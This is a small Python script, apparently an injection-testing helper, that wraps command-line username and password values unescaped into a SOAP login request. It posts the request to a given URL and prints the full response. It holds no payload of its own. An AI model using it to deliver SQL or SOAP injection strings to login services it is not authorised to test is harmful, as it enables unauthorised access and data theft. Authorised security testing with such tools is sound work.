SOAPi-2-SQLi.py

import sys
import requests
import xml.etree.ElementTree as ET

def execute_command(url, username, password):
    payload = f'''<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
        <soap:Body>
            <LoginRequest xmlns="http://tempuri.org/">
                <username>{username}</username>
                <password>{password}</password>
            </LoginRequest>
        </soap:Body>
    </soap:Envelope>'''
    
    response = requests.post(url, data=payload, headers={"SOAPAction": '"Login"'})
    print("HTTP Response Status Code:", response.status_code)
    print("HTTP Response Headers:", response.headers)
    print("HTTP Response Content:", response.content.decode('utf-8'))        

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python script.py <URL> <username> <password>")
        sys.exit(1)
    
    url = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    execute_command(url, username, password)
